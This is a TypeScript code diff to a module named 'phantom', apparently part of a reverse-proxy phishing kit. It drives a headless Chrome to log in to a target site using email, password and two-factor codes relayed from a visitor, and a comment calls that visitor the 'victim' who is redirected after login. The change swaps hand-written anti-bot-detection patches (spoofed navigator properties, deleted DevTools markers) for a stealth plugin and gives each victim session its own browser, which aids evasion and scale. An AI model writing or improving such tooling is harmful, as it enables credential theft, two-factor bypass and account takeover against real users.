@@ -1,7 +1,11 @@
-import puppeteer, { type Browser, type Page } from "puppeteer-core";
+import puppeteerExtra from "puppeteer-extra";
+import StealthPlugin from "puppeteer-extra-plugin-stealth";
+import type { Browser, Page } from "puppeteer-core";
 import { chromeLaunchArgs, findChrome, shouldRunHeadless } from "@/lib/chrome";
 import { releaseTwoFactor, setChooseMethod, setInputError, setDeviceName, submitEmail, submitPassword, setChromeError, setChromeReady } from "@/lib/demo-session";
 import type { MethodOption, TwoFactorType } from "@/lib/demo-session";
+
+puppeteerExtra.use(StealthPlugin());
 
 const TARGET_URL =
   process.env.PHANTOM_TARGET_URL ??
@@ -21,12 +25,11 @@ const PROXY_ENABLED = Boolean(PROXY_HOST && PROXY_PORT);
 // ─────────────────────────────────────────────────────────────────────────────
 
 type PhantomStore = {
-  browser: Browser | null;
+  browsers: Map<string, Browser>;       // um browser isolado por sessionId
   pages: Map<string, Page>;
-  completionTracked: Set<string>; // sessões com waitForLoginComplete ativo
+  completionTracked: Set<string>;       // sessões com waitForLoginComplete ativo
   cancelledSessions: Set<string>;
   sessionTimers: Map<string, NodeJS.Timeout>;
-  loggedIn: boolean; // true se o último Chrome concluiu login com sucesso
 };
 
 export type PhantomDebugState = {
@@ -58,7 +61,7 @@ export type PhantomDebugState = {
 function getStore(): PhantomStore {
   const g = globalThis as typeof globalThis & { __phantomStore?: PhantomStore };
   if (!g.__phantomStore) {
-    g.__phantomStore = { browser: null, pages: new Map(), completionTracked: new Set(), cancelledSessions: new Set(), sessionTimers: new Map(), loggedIn: false };
+    g.__phantomStore = { browsers: new Map(), pages: new Map(), completionTracked: new Set(), cancelledSessions: new Set(), sessionTimers: new Map() };
   }
   return g.__phantomStore;
 }
@@ -66,36 +69,23 @@ function getStore(): PhantomStore {
 const PHANTOM_SESSION_TTL_MS = Number.parseInt(process.env.PHANTOM_SESSION_TTL_MS ?? "600000", 10);
 const PASSWORD_FIELD_TIMEOUT_MS = 20000;
 
-async function launchFreshBrowser(): Promise<Browser> {
+async function launchBrowserForSession(sessionId: string): Promise<Browser> {
   const store = getStore();
 
-  // Fecha o browser anterior se existir e o login anterior não foi bem-sucedido
-  if (store.browser) {
-    try {
-      await store.browser.version(); // verifica se ainda está vivo
-      if (!store.loggedIn) {
-        console.log("[phantom] closing previous Chrome (no successful login)");
-        await store.browser.close().catch(() => {});
-      } else {
-        console.log("[phantom] keeping previous Chrome (login was successful)");
-        store.loggedIn = false; // reset para a próxima sessão
-      }
-    } catch {
-      // já estava fechado
-    }
-    store.browser = null;
-    store.pages.clear();
-    store.completionTracked.clear();
-    store.cancelledSessions.clear();
-    for (const timer of store.sessionTimers.values()) clearTimeout(timer);
-    store.sessionTimers.clear();
+  // Fecha browser anterior desta sessão se existir
+  const existing = store.browsers.get(sessionId);
+  if (existing) {
+    try { await existing.close().catch(() => {}); } catch { /* já fechado */ }
+    store.browsers.delete(sessionId);
+    store.pages.delete(sessionId);
+    store.completionTracked.delete(sessionId);
   }
 
   const executablePath = findChrome();
   if (!executablePath) throw new Error("Chrome não encontrado");
 
-  console.log("[phantom] launching fresh Chrome at:", executablePath);
-  const browser = await puppeteer.launch({
+  console.log("[phantom] launching Chrome for session", sessionId, "at:", executablePath);
+  const browser = await (puppeteerExtra.launch({
     headless: shouldRunHeadless(),
     executablePath,
     defaultViewport: null,
@@ -103,10 +93,10 @@ async function launchFreshBrowser(): Promise<Browser> {
     args: chromeLaunchArgs([
       ...(PROXY_ENABLED ? [`--proxy-server=http://${PROXY_HOST}:${PROXY_PORT}`] : []),
     ]),
-  });
-  console.log("[phantom] Chrome launched");
+  }) as unknown as Promise<Browser>);
+  console.log("[phantom] Chrome launched for session", sessionId);
 
-  store.browser = browser;
+  store.browsers.set(sessionId, browser);
   return browser;
 }
 
@@ -267,7 +257,7 @@ export async function startPhantom(sessionId: string): Promise<void> {
   try {
     getStore().cancelledSessions.delete(sessionId);
     console.log("[phantom] startPhantom", sessionId, "chrome:", findChrome());
-    const browser = await launchFreshBrowser();
+    const browser = await launchBrowserForSession(sessionId);
     console.log("[phantom] browser launched");
     const page = await browser.newPage();
     console.log("[phantom] page created");
@@ -282,37 +272,6 @@ export async function startPhantom(sessionId: string): Promise<void> {
       "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36";
     await page.setUserAgent(UA);
 
-    // Patches anti-detecção antes de qualquer navegação
-    await page.evaluateOnNewDocument(() => {
-      Object.defineProperty(navigator, "webdriver", { get: () => undefined });
-      Object.defineProperty(navigator, "plugins", { get: () => [1, 2, 3, 4, 5] });
-      Object.defineProperty(navigator, "languages", { get: () => ["pt-BR", "pt", "en-US", "en"] });
-      Object.defineProperty(navigator, "platform", { get: () => "Win32" });
-      Object.defineProperty(navigator, "vendor", { get: () => "Google Inc." });
-      Object.defineProperty(navigator, "hardwareConcurrency", { get: () => 8 });
-      Object.defineProperty(navigator, "deviceMemory", { get: () => 8 });
-      // eslint-disable-next-line @typescript-eslint/no-explicit-any
-      (window as any).chrome = {
-        runtime: {
-          onMessage: { addListener: () => {}, removeListener: () => {} },
-          connect: () => ({}),
-          sendMessage: () => {},
-        },
-        loadTimes: () => {},
-        csi: () => {},
-        app: {},
-      };
-      // Remove variáveis que expõem o CDP/DevTools
-      // eslint-disable-next-line @typescript-eslint/no-explicit-any
-      const win = window as any;
-      delete win.cdc_adoQpoasnfa76pfcZLmcfl_Array;
-      delete win.cdc_adoQpoasnfa76pfcZLmcfl_Promise;
-      delete win.cdc_adoQpoasnfa76pfcZLmcfl_Symbol;
-      const orig = navigator.permissions.query.bind(navigator.permissions);
-      // eslint-disable-next-line @typescript-eslint/no-explicit-any
-      navigator.permissions.query = (p: any) =>
-        p.name === "notifications" ? Promise.resolve({ state: "denied" } as PermissionStatus) : orig(p);
-    });
 
     console.log("[phantom] navigating to", TARGET_URL);
     await page.goto(TARGET_URL, { waitUntil: "domcontentloaded", timeout: 15000 });
@@ -643,7 +602,6 @@ async function waitForLoginComplete(sessionId: string, page: Page): Promise<void
         page.off("framenavigated", onNav);
         page.off("close", onNav);
         console.log("[phantom] login complete →", url);
-        getStore().loggedIn = true; // preserva o Chrome para a próxima sessão
         const session = getDemoSession(sessionId);
         // Redireciona a vítima para a URL real onde o Chrome chegou após login
         if (session) session.forceRedirect = url;
@@ -1415,14 +1373,10 @@ export function closePhantom(sessionId: string): void {
   const timer = store.sessionTimers.get(sessionId);
   if (timer) clearTimeout(timer);
   store.sessionTimers.delete(sessionId);
-  const page = store.pages.get(sessionId);
-  if (page) {
-    void page.close().catch(() => {});
-    store.pages.delete(sessionId);
-  }
-  if (store.pages.size === 0 && store.browser) {
-    void store.browser.close().catch(() => {});
-    store.browser = null;
-    store.loggedIn = false;
+  store.pages.delete(sessionId);
+  const browser = store.browsers.get(sessionId);
+  if (browser) {
+    void browser.close().catch(() => {});
+    store.browsers.delete(sessionId);
   }
 }
